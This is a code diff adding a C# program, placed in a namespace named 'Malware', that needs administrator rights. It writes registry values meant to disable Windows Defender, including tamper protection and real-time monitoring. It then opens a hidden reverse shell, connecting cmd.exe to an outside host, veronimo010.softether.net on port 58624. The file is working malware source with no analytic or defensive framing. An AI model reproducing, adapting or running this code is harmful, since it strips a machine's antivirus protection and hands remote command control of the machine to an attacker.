@@ -1,0 +1,107 @@
+
+using System;
+using System.Linq;
+using System.Net;
+using Microsoft.Win32;
+using System.Diagnostics;
+using System.Text;
+using System.IO;
+using System.ComponentModel;
+using System.Net.Sockets;
+using System.Security.Principal;
+
+namespace Malware
+{
+    class Program
+    {
+        static void Main()
+        {
+            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
+            {
+                Console.WriteLine("Please run this program as an administrator.");
+                return;
+            }
+
+            DisableWindowsDefender();
+            EstablishReverseShell();
+        }
+
+        static void DisableWindowsDefender()
+        {
+            RegistryEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0"); //Windows 10 1903 Redstone 6
+            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
+            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1");
+            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
+            RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
+        }
+
+        static void RegistryEdit(string regPath, string name, string value)
+        {
+            try
+            {
+                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, true))
+                {
+                    if (key == null)
+                    {
+                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
+                        return;
+                    }
+                    if (key.GetValue(name) != (object)value)
+                        key.SetValue(name, value, RegistryValueKind.DWord);
+                }
+            }
+            catch { }
+        }
+
+        static void EstablishReverseShell()
+        {
+            using (TcpClient client = new TcpClient("veronimo010.softether.net", 58624))
+            {
+                using (Stream stream = client.GetStream())
+                {
+                    using (StreamReader rdr = new StreamReader(stream))
+                    {
+                        using (StreamWriter streamWriter = new StreamWriter(stream))
+                        {
+                            StringBuilder strInput = new StringBuilder();
+
+                            Process p = new Process();
+                            p.StartInfo.FileName = "cmd";
+                            p.StartInfo.CreateNoWindow = true;
+                            p.StartInfo.UseShellExecute = false;
+                            p.StartInfo.RedirectStandardOutput = true;
+                            p.StartInfo.RedirectStandardInput = true;
+                            p.StartInfo.RedirectStandardError = true;
+                            p.OutputDataReceived += new DataReceivedEventHandler((sendingProcess, outLine) => CmdOutputDataHandler(sendingProcess, outLine, streamWriter));
+                            p.Start();
+                            p.BeginOutputReadLine();
+
+                            while (true)
+                            {
+                                strInput.Append(rdr.ReadLine());
+                                p.StandardInput.WriteLine(strInput);
+                                strInput.Remove(0, strInput.Length);
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine, StreamWriter streamWriter)
+        {
+            StringBuilder strOutput = new StringBuilder();
+
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    strOutput.Append(outLine.Data);
+                    streamWriter.WriteLine(strOutput);
+                    streamWriter.Flush();
+                }
+                catch (Exception err) { }
+            }
+        }
+    }
+}
